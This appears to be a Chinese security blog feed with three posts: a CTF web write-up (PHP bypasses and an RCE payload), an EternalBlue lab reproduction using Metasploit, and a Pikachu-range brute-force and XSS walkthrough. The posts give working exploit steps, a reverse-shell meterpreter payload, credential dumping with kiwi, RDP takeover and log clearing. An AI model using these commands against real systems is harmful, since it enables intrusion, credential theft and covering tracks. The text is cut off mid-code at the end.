url+?key1&#x3D;QNKCDZO&amp;key2&#x3D;240610708&amp;key4[]&#x3D;1</p><p>POST：key3[]&#x3D;1</p></blockquote><h4 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h4><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082020738.png"></p><p>通过is_numeric()函数使传入的key5不能为纯数字且必须大于2023，则可以通过在2024后加字母来进行绕过</p><blockquote><p>构造Payload url+?key1&#x3D;QNKCDZO&amp;key2&#x3D;240610708&amp;key4[]&#x3D;1&amp;key5&#x3D;2024a</p><p>POST：key3[]&#x3D;1</p></blockquote><h4 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h4><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082021897.png"></p><p>上面的正则表达式过滤了大小写字母和数字，而extract所导致的可以使本题也可以通过数组进行绕过</p><blockquote><p>构造Payload url+?key1&#x3D;QNKCDZO&amp;key2&#x3D;240610708&amp;key4[]&#x3D;1&amp;key5&#x3D;2024a</p><p>POST：key3[]&#x3D;1&amp;flag5[]&#x3D;1</p></blockquote><p>得到flag</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082026497.png"></p><h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310231514818.png"></p><p>首先打开本题环境可以看到上述php代码</p><p>需要我们先找到一个$password进行MD5加密后前六个值为“c4d038”，然后在输入一个可执行的$code能够避开所过滤的值，从而得到flag</p><p>我们可以通过MD5碰撞得到为我们需要的$password，其值为 ： <strong>“114514”</strong></p><p>然后会发现无论我们怎么去输入$code，只要传参为<strong>e_v.a.l</strong>都无法使其执行成功，这是，这是因为在php中，空格和点无论是get或post传参都无法正常转换</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310231521007.png"></p><p>所以为了防止其被过滤，我们可以通过修改_来解决，这也是利用php版本问题</p><blockquote><p>当<code>PHP版本小于8</code>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>，也就是说如果中括号<code>[</code>出现在前面，那么中括号<code>[</code>还是会被转换成下划线<code>_</code>，但是因为出错导致接下来的非法字符并不会被转换成下划线<code>_</code></p></blockquote><p><strong>这就说明，如果我们将’-‘修改为’[‘，则后续的俩个.不会被更改为’-‘,而[也会被正常转换为’_’</strong></p><p>所以我们构造如下的$code</p><blockquote><p>payload: POST: password&#x3D;114514&amp;e[v.a.l&#x3D;echo <code>tac /f*</code>;</p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310231529514.png"></p><h3 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h3><p>本题打开为一登录网站，如果登录进去后就是一个类似于chatgpt的东西，考虑其应该从登录页面下手，发现其为弱密码爆破，通过BP抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310231535100.png"></p><p>通过BP抓包发现其密码也被MD5加密过</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310231537883.png"></p><p>通过弱密码爆破，发现其密码为000000，这里图省事直接输入爆破了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310231538036.png"></p><p>通过代理中的HTTP历史记录，可以发现一个302跳转，点击进去发现里面有着flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310231544781.png"></p><h2 id="CPYPTO"><a href="#CPYPTO" class="headerlink" title="CPYPTO"></a>CPYPTO</h2>]]></content>
      
      
      
        <tags>
            
            <tag> 基础、新手、WEB学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>永恒之蓝复现(附带win7虚拟机安装教程)</title>
      <link href="/2023/08/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0-%E9%99%84%E5%B8%A6win7%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
      <url>/2023/08/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0-%E9%99%84%E5%B8%A6win7%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="Win7虚拟机安装"><a href="#Win7虚拟机安装" class="headerlink" title="Win7虚拟机安装"></a>Win7虚拟机安装</h3><p>首先进入该网站  <a href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn/</a></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112029452.png"></p><p>下载一个win7 iso镜像，然后打开Vmware</p><p><strong>第一步</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112030084.png"></p><p><strong>第二步</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112033933.png"></p><p><strong>第三步</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112033763.png"></p><p><strong>第四步</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112034601.png"></p><p><strong>第五步</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112034620.png"></p><p><strong>第六步、选择BIOS</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112035984.png"></p><p><strong>第七步、选择处理器数量</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112038769.png"></p><p><strong>第八步、选择内存大小</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112036106.png"></p><p><strong>第九步、选择桥接网络</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112038948.png"></p><p><strong>第十步、按推荐来就行</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112039895.png"></p><p><strong>第十一步、按推荐来就行</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112040219.png"></p><p><strong>第十二步</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112041703.png"></p><p><strong>第十三步</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112041787.png"></p><p><strong>第十四步</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112042955.png"></p><p>然后完成即可</p><p><strong>第十五步、在CD&#x2F;DVD中选择镜像文件</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112044247.png"></p><p>然后开机</p><p><strong>第十六步、下一步</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112045752.png"></p><p>下一步后直接现在安装</p><p><strong>第十七步、选择接受和下一步</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112047671.png"></p><p><strong>第十八步、选择自定义(高级)</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112047900.png"></p><p><strong>第十九步、下一步即可</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112049363.png"></p><p><strong>第二十步、取个用户名</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112056351.png"></p><p><strong>第二十一步、设置密码</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112057736.png"></p><p><strong>第二十二步、直接下一步就行</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112058488.png"></p><p><strong>第二十三步、使用推荐设置</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112059842.png"></p><p>后面跟随系统指引即可</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112100185.png"></p><h3 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h3><blockquote><p>攻击机：kali</p><p>ip地址：192.168.1.17</p></blockquote><blockquote><p>被攻击机：window 7</p><p>ip地址：192.168.1.18</p></blockquote><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>一、先测试能否相互ping通</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141617217.png"></p><p>![](<a href="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112111556.png">https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112111556.png</a></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112111583.png"></p><p>二、在kali上用nmap扫描局域网内主机</p><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">nmap -sP 192.168.1.1&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现被攻击机</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141618780.png"></p><p>三、扫描端口查看其运行的服务</p><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">nmap -p 1-65535 -A 192.168.1.18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141620919.png"></p><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">masscan --rate&#x3D;10000 -p1-65535 192.168.1.18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141616556.png"></p><p>发现445端口  正是永恒之蓝利用的便是445端口中的SMB服务获取系统的最高权限</p><p>四、进行漏洞扫描</p><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">nmap --script&#x3D;vuln 192.168.1.18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141625140.png"></p><p>扫描的漏洞中包括<strong>MS17-010漏洞</strong></p><p>五、进入MSF控制台</p><pre class="line-numbers language-kali" data-language="kali"><code class="language-kali">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>寻找我们刚才扫描到的 <strong>MS17-010漏洞</strong></p><pre class="line-numbers language-msf" data-language="msf"><code class="language-msf">search ms17-010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141628161.png"></p><p>在其中</p><p>3代表着永恒之蓝扫描模块,探测主机是否存在永恒之蓝的漏洞</p><p>0代表着永恒之蓝攻击模块，用于攻击目标用户，</p><p>数字需要自己判断你自己的攻击模块在哪，每个人都不一样</p><p>加载扫描模块</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">use 3   use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010       &#x2F;&#x2F;俩者皆可，输入一个就行show options    &#x2F;&#x2F;查看该模块所需的参数配置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141633575.png"></p><p>发现其RHOSTS尚未配置</p><p>设置攻击目标的ip</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">set rhosts 192.168.1.18设置后执行扫描run           &#x2F;&#x2F;进行扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141635700.png"></p><p>说明可以进行攻击，但是我们上面其实已经扫过该目标靶机里面有永恒之蓝漏洞</p><p>六、使用攻击模块</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">use 0    use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue    &#x2F;&#x2F;使用一个即可show options    set rhosts 192.168.1.18   &#x2F;&#x2F;设置目标主机ipset payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp  &#x2F;&#x2F;设置payloadset lhost 192.168.1.17   &#x2F;&#x2F;设置攻击机ip run  或  exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141644517.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141646012.png"></p><p>运行成功会出现meterpreter控制台，并在结尾处出现 WIN  这时候我们就已经拿到权限并且可以使用</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141649007.png"></p><h3 id="演示功能"><a href="#演示功能" class="headerlink" title="演示功能"></a>演示功能</h3><h4 id="一、屏幕截取"><a href="#一、屏幕截取" class="headerlink" title="一、屏幕截取"></a>一、屏幕截取</h4><pre class="line-numbers language-none"><code class="language-none">screenshot<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141654891.png"></p><h4 id="二、上传-x2F-下载文件"><a href="#二、上传-x2F-下载文件" class="headerlink" title="二、上传&#x2F;下载文件"></a>二、上传&#x2F;下载文件</h4><p>上传文件</p><pre class="line-numbers language-none"><code class="language-none">upload 1.txt c:&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141656746.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141657662.png"></p><p>下载文件</p><pre class="line-numbers language-none"><code class="language-none">download c:&#x2F;&#x2F;2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141706192.png"></p><h4 id="三、获取CMD"><a href="#三、获取CMD" class="headerlink" title="三、获取CMD"></a>三、获取CMD</h4><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141712539.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141713076.png"></p><h4 id="四、获取用户密码"><a href="#四、获取用户密码" class="headerlink" title="四、获取用户密码"></a>四、获取用户密码</h4><pre class="line-numbers language-none"><code class="language-none">load kiwi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141715113.png"></p><pre class="line-numbers language-none"><code class="language-none">creds_all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141716805.png"></p><p>启用远程桌面</p><pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141717749.png"></p><p>查看用户空闲时间，以防将其顶掉被发现</p><pre class="line-numbers language-none"><code class="language-none">idletime<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后调到kali的管理员终端</p><pre class="line-numbers language-none"><code class="language-none">rdesktop 192.168.1.18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141725948.png"></p><p>原账户被顶掉，当然也可以利用自己提权然后自己新创一个用户登录</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141724467.png"></p><h4 id="五、清理日志"><a href="#五、清理日志" class="headerlink" title="五、清理日志"></a>五、清理日志</h4><p>清理前</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141729848.png"></p><p>清理后</p><pre class="line-numbers language-none"><code class="language-none">clearev        &#x2F;&#x2F;在meterpreter上<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141730360.png"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>以上就是我对永恒之蓝的复现</p><p>参考链接：<a href="https://blog.csdn.net/ElsonHY/article/details/109939420">MS17-010（Eternal blue永恒之蓝）漏洞利用+修复方法_RDrug的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/m0_62584974/article/details/126322675">MS17-010漏洞复现（带win7虚拟机安装，零基础）_永恒之蓝镜像_墨言ink的博客-CSDN博客</a></p><p>从大佬的博客中学到很多，也对这个漏洞更加了解。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞，虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pikachu靶场全通关思路</title>
      <link href="/2023/07/30/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%E6%80%9D%E8%B7%AF/"/>
      <url>/2023/07/30/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h3 id="一、基于表单的暴力破解"><a href="#一、基于表单的暴力破解" class="headerlink" title="一、基于表单的暴力破解"></a>一、基于表单的暴力破解</h3><p>本题打开后为一个简单的登录界面</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312139255.png"></p><p>无论是用户名还是密码我们都是无从知晓的，所以需要通过BP来爆破出其各自的值</p><p>先随便输入用户名和密码通过BP抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312139452.png"></p><p>然后发送给BP的Intruder(测试器)，利用其中的Clusterbomb(集束炸弹)分别对用户名和密码进行爆破，得到用户名和密码分别为admin&#x2F;123456</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312140847.png"></p><p>不过本题也不只这一个用户名和密码。</p><h3 id="二、验证码绕过-on-server"><a href="#二、验证码绕过-on-server" class="headerlink" title="二、验证码绕过(on server)"></a>二、验证码绕过(on server)</h3><p>本题在原本的用户名和密码上多了一个验证码，同样的先用BP进行抓包，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312140543.png"></p><p>通过抓包重发，发现只要验证码可以重复使用，即当第一次验证码输对以后，只需要去爆破用户名和密码即可，为方便即默认用户名为admin(也可以选择和第一题一样)，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312140211.png"></p><p>得到密码为123456，登录成功</p><h3 id="三、验证码绕过-on-client"><a href="#三、验证码绕过-on-client" class="headerlink" title="三、验证码绕过(on client)"></a>三、验证码绕过(on client)</h3><p>先进行BP抓包，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312140290.png"></p><p>由于本题是前端验证，所以即使我们将vcode那一处给删除掉，回显仍然判断为用户名和密码不存在</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312140627.png"></p><p>所以接下来只需要去爆破出密码即可</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312140251.png"></p><h3 id="四、token防爆破"><a href="#四、token防爆破" class="headerlink" title="四、token防爆破"></a>四、token防爆破</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312140934.png"></p><p>发现当修改密码再发送时会出现另一种回显</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141962.png"></p><p>即每个数据包都被添加了token验证机制，尝试使用Intruder(测试器)中的Pitchfork(音叉)</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141334.png"></p><p>然后在选项中进行修改</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141085.png"></p><p>找到Grep-Extract进行添加</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141742.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141767.png"></p><p>即从 <strong>value:”</strong> 开始到 <strong>“ &#x2F;&gt;\n\n                <label></strong> 结束</p><p>然后再重定向中选择 <strong>总是</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141966.png"></p><p>转到有效载荷，有效负载集为1时即为爆破密码</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141239.png"></p><p>有效负载集选为2，并在有效载荷类型中选择    Recursive grep(递归搜索) </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141151.png"></p><p>开始攻击</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141964.png"></p><h2 id="Cross-Site-Scripting-（XSS）"><a href="#Cross-Site-Scripting-（XSS）" class="headerlink" title="Cross-Site Scripting （XSS）"></a>Cross-Site Scripting （XSS）</h2><h3 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h3><blockquote><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：<br>                          1.反射性XSS;<br>                          2.存储型XSS;<br>                          3.DOM型XSS;</p><p>​                        XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。<br>​                        XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。<br>​                        形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。<br>​                        因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:<br>​                         输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;<br>​                         输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</p></blockquote><h3 id="二、反射型xss-get"><a href="#二、反射型xss-get" class="headerlink" title="二、反射型xss(get)"></a>二、反射型xss(get)</h3><p>本题有着长度限制，不过可以通过F12进行修改，或者先随便输入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312142096.png"></p><p>然后通过上方url中的message构成XSS恶意语句，得到弹窗</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312142803.png"></p><h3 id="三、反射性xss-post"><a href="#三、反射性xss-post" class="headerlink" title="三、反射性xss(post)"></a>三、反射性xss(post)</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312142528.png"></p><p>首先他想让你登录，不过用户名和密码就是暴力破解时得到的，登录成功后，直接在输入框中构造XSS恶意语句</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312142921.png"></p><p>或者 输入此构造伪链接 </p><!--<a href=javascript:alert(/我是弹窗/)>别点我没结果</a>--><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312142923.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312142497.png"></p><h3 id="四、存储型xss"><a href="#四、存储型xss" class="headerlink" title="四、存储型xss"></a>四、存储型xss</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312142139.png"></p><p>本题直接在留言版上写下XSS恶意语句，然后每次点开后就会出现弹窗</p><p>​          <!--<script>alert('我是弹窗')</script>--></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312143961.png"></p><p>千万不要在留言板上写这个</p> <!--<script type="text/javascript" >window.location.href="http://www.baidu.com";</script>--><p>不然后面你每次点开存储型XSS就会自动跳转百度</p><h3 id="五、DOM型xss"><a href="#五、DOM型xss" class="headerlink" title="五、DOM型xss"></a>五、DOM型xss</h3><p>在源码中我们可以找到这个语句</p><p><code>document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;what do you see?&lt;/a&gt;&quot;;</code></p><p>即我们输入框中的内容就是str，所以我们需要在输入框中输入一个内容，使之达到闭合，以此出现弹窗</p><p>构造语句 <strong>‘onclick&#x3D;alert(‘我是弹窗’)&gt;</strong></p><p>构造后的语句为 </p><!--<a href=''onclick=alert('我是弹窗')>'>what do you see?</a>--><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312143436.png"></p><p>点击下方蓝体，得到弹窗</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312143114.png"></p><h3 id="六、DOM型xss-x"><a href="#六、DOM型xss-x" class="headerlink" title="六、DOM型xss-x"></a>六、DOM型xss-x</h3><p>和第五题一样，在输入框中输入 <strong>‘onclick&#x3D;alert(‘我是弹窗’)&gt;</strong></p><p>然后下面出现的蓝体文字多点几下就出弹窗了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312143667.png"></p><h3 id="七、xss之盲打"><a href="#七、xss之盲打" class="headerlink" title="七、xss之盲打"></a>七、xss之盲打</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312143034.png"></p><p>有框你不打？</p><!--  <script>alert('我是弹窗')</script>--><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312143091.png"></p><p>然后本题有着后台登录地址，登录进去看看</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144578.png"></p><p>然后就会被弹了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144537.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144304.png"></p><p>盲打的本意就是我们也不知道这个是否会触发，而当管理员打开后台后自动执行xss出现这个弹窗这说明盲打成功</p><h3 id="八、xss之过滤"><a href="#八、xss之过滤" class="headerlink" title="八、xss之过滤"></a>八、xss之过滤</h3><blockquote><p>xss过滤绕过技巧</p><p>1、改变大小写</p><p>2、关闭标签</p><p>3、使用hex编码绕过</p><p>4、绕过magic_quotes_gpc</p><p>5、利用&lt;&gt;标记注射Html&#x2F;Javascript</p><p>6、利用HTML标签属性值执行XSS</p><p>7、空格&#x2F;回车&#x2F;Tab</p><p>8、对标签属性值进行转码</p><p>9、产生自己的事件</p><p>10、利用CSS跨站剖析<br>这里不做赘述，如果想要了解，可以访问[大佬博客](<a href="https://blog.csdn.net/free_xiaochen/article/details/82289316">XSS篇——XSS过滤绕过技巧_xss &lt;被过滤了怎么构造命令_free_xiaochen的博客-CSDN博客</a>)</p></blockquote><p>本题经过尝试是字母大小写绕过</p><!--<Script>alert('我是弹窗')</Script>--><p>这样修改一下就可以触发弹窗</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144494.png"></p><h3 id="九、xss之htmlspecialchars"><a href="#九、xss之htmlspecialchars" class="headerlink" title="九、xss之htmlspecialchars"></a>九、xss之htmlspecialchars</h3><p><strong>htmlspecialchars定义和用法</strong></p><blockquote><p>htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。</p><p>预定义的字符是：</p><ul><li>&amp; （和号）成为 &amp;</li><li>“ （双引号）成为 &quot;</li><li>‘ （单引号）成为 ‘</li><li>&lt; （小于）成为 &lt;</li><li>&gt; （大于）成为 &gt;</li></ul><p><strong>提示：</strong>要把特殊的 HTML 实体转换回字符，请使用 <a href="https://www.runoob.com/php/func-string-htmlspecialchars-decode.html">htmlspecialchars_decode()</a> 函数。</p></blockquote><p>所以当我们输入xss恶意语句时，会发现被转换为实体符号</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308012136704.png"></p><p>所以我们需要构造如下的语句</p><!--**'οnclick='alert("我是弹窗")'**  or  **'onclick='alert(/htmlspecialchars/)'**--><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144582.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144485.png"></p><h3 id="十、xss之href输出"><a href="#十、xss之href输出" class="headerlink" title="十、xss之href输出"></a>十、xss之href输出</h3><p>本题中如果仍使用正常的xss恶意语句，虽可以得到蓝字回显，但点进去却只是403，经测试无论是双写绕过还是大小写等都不可，这里就可以使用另一种方法，js伪协议绕过</p><p>构造  <!--**javascript:alert("我是弹窗")**--></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144368.png"></p><h3 id="十一、xss之js输出"><a href="#十一、xss之js输出" class="headerlink" title="十一、xss之js输出"></a>十一、xss之js输出</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144286.png"></p><p>先随便输入，得到回显，然后通过源代码找到这一处位置</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    $ms<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>$ms<span class="token 